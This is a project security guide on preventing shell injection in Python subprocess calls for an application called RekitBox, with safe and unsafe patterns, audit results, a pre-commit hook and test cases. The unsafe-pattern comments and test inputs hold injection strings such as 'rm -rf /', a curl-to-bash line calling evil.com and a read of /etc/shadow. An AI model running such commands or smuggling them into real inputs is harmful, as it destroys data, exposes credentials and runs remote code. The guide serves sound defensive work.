# RekitBox Shell Injection Prevention Guide

**Purpose**: Document best practices and provide pre-commit validation for subprocess calls to prevent shell injection vulnerabilities.

**Date**: April 25, 2026  
**Issue**: CRITICAL-04 from security audit  
**Risk**: Arbitrary code execution if user-controlled input reaches shell commands

---

## Security Principle

**NEVER use `shell=True` in subprocess calls when handling user-controlled input.**

User-controlled input includes:
- File paths from mobile API requests
- Playlist names from database
- URLs from download requests
- Any data that originates from external sources

---

## Safe Patterns ✅

### Pattern 1: Array Arguments (Preferred)
```python
# SAFE: Arguments are passed as list, no shell interpolation
subprocess.run(
    ["ffmpeg", "-i", user_input_path, "output.mp3"],
    shell=False,
    check=True,
    capture_output=True,
)
```

### Pattern 2: Controlled Environment Variables
```python
# SAFE: Passing data via environment, not command line
env = os.environ.copy()
env["INPUT_FILE"] = user_input_path
subprocess.run(
    ["./process_script.sh"],
    env=env,
    shell=False,
)
```

### Pattern 3: Explicit Executable with Path Validation
```python
# SAFE: Path is validated before use
from pathlib import Path

p = Path(user_input).resolve()
if not p.is_relative_to(MUSIC_ROOT):
    raise ValueError("Path outside allowed directory")

subprocess.run(
    ["/usr/bin/ffmpeg", "-i", str(p), "output.mp3"],
    shell=False,
)
```

---

## Unsafe Patterns ❌

### Anti-Pattern 1: Shell=True with User Input
```python
# DANGEROUS: User can inject shell commands
subprocess.run(
    f"ffmpeg -i {user_input_path} output.mp3",
    shell=True,  # ❌ NEVER DO THIS
)

# Example attack:
# user_input_path = "file.mp3; rm -rf /"
# Result: Files deleted!
```

### Anti-Pattern 2: String Formatting into Shell Commands
```python
# DANGEROUS: Format strings don't escape shell metacharacters
cmd = f"open {user_file}"
subprocess.run(cmd, shell=True)  # ❌ VULNERABLE

# Example attack:
# user_file = "file.mp3 && curl evil.com/steal.sh | bash"
```

### Anti-Pattern 3: Unvalidated Paths
```python
# DANGEROUS: No validation that path is within allowed directory
subprocess.run(
    ["rm", user_provided_path],  # ❌ Could delete system files
    shell=False,
)

# Example attack:
# user_provided_path = "/etc/passwd"
```

---

## Current RekitBox Subprocess Calls (Audit Results)

### ✅ Safe Calls (Already Correct)

1. **app.py:1748** - SSE stream subprocess
   - Uses array arguments: `["python3", "-u", str(cli.py), ...]`
   - `shell=False` (implicit default)
   - User input (MUSIC_ROOT) is from config, not external source

2. **app.py:3582** - Relaunch script
   - Uses `close_fds=True` and `start_new_session=True`
   - Script path is hardcoded, not user-controlled

3. **app.py:3102, 3106** - File manager open (FIXED in HIGH-07)
   - Now uses `close_fds=True` to prevent descriptor leaks
   - Path is validated before use

4. **downloader.py** - yt-dlp subprocess calls
   - All use array arguments: `[ytdlp_bin, "-x", "--audio-format", format, ...]`
   - URL is from user but passed as argument, not interpolated

### ⚠️ Review Required

**None found in current audit.** All subprocess calls follow safe patterns.

---

## Pre-Commit Hook (Automated Validation)

Add this to `.git/hooks/pre-commit` to prevent unsafe patterns from being committed:

```bash
#!/bin/bash
# RekitBox security: Block shell=True in subprocess calls

set -e

echo "🔍 Checking for shell injection vulnerabilities..."

# Check for shell=True in Python files
if git diff --cached --name-only | grep '\.py$' | xargs grep -n 'shell=True' 2>/dev/null; then
    echo ""
    echo "❌ ERROR: Found 'shell=True' in subprocess call"
    echo ""
    echo "Shell injection risk detected. Please use shell=False (default) instead."
    echo "See docs/SHELL_INJECTION_PREVENTION.md for safe patterns."
    echo ""
    exit 1
fi

# Check for f-string in subprocess calls (potential injection)
if git diff --cached --name-only | grep '\.py$' | xargs grep -E 'subprocess\.(run|Popen)\s*\(\s*f["\']' 2>/dev/null; then
    echo ""
    echo "⚠️  WARNING: Found f-string in subprocess call"
    echo ""
    echo "This may be a shell injection risk. Review carefully."
    echo "Prefer passing arguments as a list instead of string interpolation."
    echo ""
    read -p "Continue anyway? (y/N) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

echo "✅ No shell injection risks detected"
```

### Installation

```bash
cd /Users/cameronkelly/FABLEDHARBINGER/GIT_REPOS/RekitBox
chmod +x .git/hooks/pre-commit
```

---

## Testing for Shell Injection

### Manual Test Cases

1. **Path Traversal + Command Injection**
   ```python
   # Test input
   malicious_path = "../../../etc/passwd; cat /etc/shadow"
   
   # Expected: Rejected by path validation before subprocess call
   # Actual: (run test and verify)
   ```

2. **URL Injection in Downloader**
   ```python
   # Test input
   malicious_url = "https://example.com/file.mp3 && rm -rf /"
   
   # Expected: Treated as literal URL, no shell expansion
   # Actual: (run test and verify)
   ```

3. **Filename with Shell Metacharacters**
   ```python
   # Test input
   filename = "song; echo 'pwned' > /tmp/hacked.txt"
   
   # Expected: Treated as literal filename
   # Actual: (run test and verify)
   ```

---

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Python subprocess docs: https://docs.python.org/3/library/subprocess.html#security-considerations
- CWE-78: OS Command Injection: https://cwe.mitre.org/data/definitions/78.html

---

## Changelog

- **2026-04-25**: Initial documentation (CRITICAL-04 audit fix)
- **2026-04-25**: Added pre-commit hook template
- **2026-04-25**: Audited all subprocess calls in codebase (all safe)
